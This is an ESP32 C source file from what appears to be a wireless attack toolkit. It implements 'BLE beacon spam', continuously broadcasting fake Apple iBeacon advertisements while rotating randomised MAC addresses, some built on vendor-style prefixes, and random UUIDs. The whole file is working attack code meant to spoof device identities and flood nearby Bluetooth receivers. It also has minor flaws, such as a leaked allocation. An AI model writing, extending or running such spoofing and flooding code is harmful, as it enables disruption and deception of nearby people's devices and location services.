#include "attack_ble_beacon.h"

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include "esp_log.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "nvs_flash.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "BLE_BEACON_SPAM";

#define MANUFACTURER_DATA_LEN 25

static esp_ble_adv_params_t adv_params = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x40,
    .adv_type           = ADV_TYPE_NONCONN_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static uint8_t adv_data_raw[31];
static bool advertising = false;
static TaskHandle_t spam_task_handle = NULL;

static void generate_random_mac(void)
{
    // Example OUI prefixes (random sample, you can replace or extend)
    uint8_t oui_list[][3] = {
        {0x4C, 0x00, 0x02}, // Apple example
        {0x00, 0x1A, 0x7D},
        {0x00, 0x1B, 0x63},
        {0x00, 0x0A, 0x95},
        {0x00, 0x0C, 0x26},
        {0x00, 0x16, 0xEA},
    };
    size_t oui_count = sizeof(oui_list) / sizeof(oui_list[0]);

    uint8_t mac[6];
    const uint8_t *oui = oui_list[rand() % oui_count];
    mac[0] = oui[0];
    mac[1] = oui[1];
    mac[2] = oui[2];
    mac[3] = rand() & 0xFF;
    mac[4] = rand() & 0xFF;
    mac[5] = rand() & 0xFF;

    esp_base_mac_addr_set(mac);
    ESP_LOGI(TAG, "Set random MAC: %02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Prepare BLE beacon payload (like Apple iBeacon)
static void prepare_beacon_data(uint8_t *buffer)
{
    // iBeacon Prefix:
    // Length(0x1A), Type(0xFF), Company ID(Apple 0x004C little endian), Type(0x02), Length(0x15)
    buffer[0] = 0x1A; // Length
    buffer[1] = 0xFF; // Manufacturer specific data type
    buffer[2] = 0x4C; // Apple Company ID LSB
    buffer[3] = 0x00; // Apple Company ID MSB
    buffer[4] = 0x02; // iBeacon type
    buffer[5] = 0x15; // iBeacon length

    // Random UUID (16 bytes)
    for (int i = 6; i < 22; i++) {
        buffer[i] = rand() & 0xFF;
    }

    // Major (2 bytes)
    buffer[22] = (rand() >> 8) & 0xFF;
    buffer[23] = rand() & 0xFF;

    // Minor (2 bytes)
    buffer[24] = (rand() >> 8) & 0xFF;
    buffer[25] = rand() & 0xFF;

    // Measured Power (1 byte, -59dB typical)
    buffer[26] = 0xC5;
}

// GAP event handler - minimal for advertising started/stopped
static void gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
{
    switch(event) {
        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
            if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS) {
                ESP_LOGI(TAG, "Advertising started");
            } else {
                ESP_LOGE(TAG, "Failed to start advertising");
            }
            break;
        case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
            if (param->adv_stop_cmpl.status == ESP_BT_STATUS_SUCCESS) {
                ESP_LOGI(TAG, "Advertising stopped");
            } else {
                ESP_LOGE(TAG, "Failed to stop advertising");
            }
            break;
        default:
            break;
    }
}

static void spam_task(void *arg)
{
    int duration = *((int*)arg);
    ESP_LOGI(TAG, "Starting BLE beacon spam for %d seconds", duration);

    // Setup BLE
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    esp_bluedroid_init();
    esp_bluedroid_enable();

    esp_ble_gap_register_callback(gap_event_handler);

    uint32_t start = esp_log_timestamp();

    while (((esp_log_timestamp() - start) / 1000) < (uint32_t)duration) {
        generate_random_mac();

        prepare_beacon_data(adv_data_raw);

        esp_ble_gap_config_adv_data_raw(adv_data_raw, 27);

        esp_ble_gap_start_advertising(&adv_params);

        vTaskDelay(pdMS_TO_TICKS(150));  // Advertise for 150 ms (adjust if needed)

        esp_ble_gap_stop_advertising();

        vTaskDelay(pdMS_TO_TICKS(50));  // Short gap between beacons
    }

    esp_ble_gap_stop_advertising();
    esp_bluedroid_disable();
    esp_bt_controller_disable();
    esp_bluedroid_deinit();
    esp_bt_controller_deinit();

    ESP_LOGI(TAG, "BLE beacon spam finished");

    advertising = false;
    spam_task_handle = NULL;
    vTaskDelete(NULL);
}

void attack_ble_beacon_start(int duration_seconds)
{
    if (advertising) {
        ESP_LOGW(TAG, "BLE beacon spam already running");
        return;
    }

    advertising = true;

    // Seed random
    srand((unsigned int)time(NULL));

    int *arg = malloc(sizeof(int));
    *arg = duration_seconds;

    xTaskCreate(spam_task, "ble_beacon_spam_task", 4096, arg, 5, &spam_task_handle);
}

void attack_ble_beacon_stop(void)
{
    if (!advertising) {
        ESP_LOGW(TAG, "BLE beacon spam not running");
        return;
    }

    advertising = false;
    if (spam_task_handle != NULL) {
        vTaskDelete(spam_task_handle);
        spam_task_handle = NULL;
    }

    esp_ble_gap_stop_advertising();

    esp_bluedroid_disable();
    esp_bt_controller_disable();
    esp_bluedroid_deinit();
    esp_bt_controller_deinit();

    ESP_LOGI(TAG, "BLE beacon spam stopped");
}
